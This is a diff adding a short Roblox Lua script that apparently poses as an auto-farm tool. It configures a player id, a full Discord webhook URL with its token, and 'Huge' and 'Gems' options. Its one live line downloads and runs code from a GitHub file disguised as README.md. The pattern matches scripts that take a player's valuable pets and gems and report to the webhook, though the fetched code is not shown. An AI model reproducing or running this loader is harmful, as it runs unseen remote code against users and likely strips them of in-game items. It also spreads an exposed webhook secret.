@@ -1,0 +1,9 @@
+-- Player id "2434574896"
+
+-- Webhook "https://discord.com/api/webhooks/1041662748980940830/eHwDizZMZUF11XG3WI6SFRUGn3vmOg-hGE7sRUHmN5FgPEqYYu2BV9qBYk1OlaYpr2D9"
+
+-- local Huge "yes" --yes or no
+
+-- local Gems "yes" --yes or no 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kissedles/AutoFarm1/main/README.md"))()
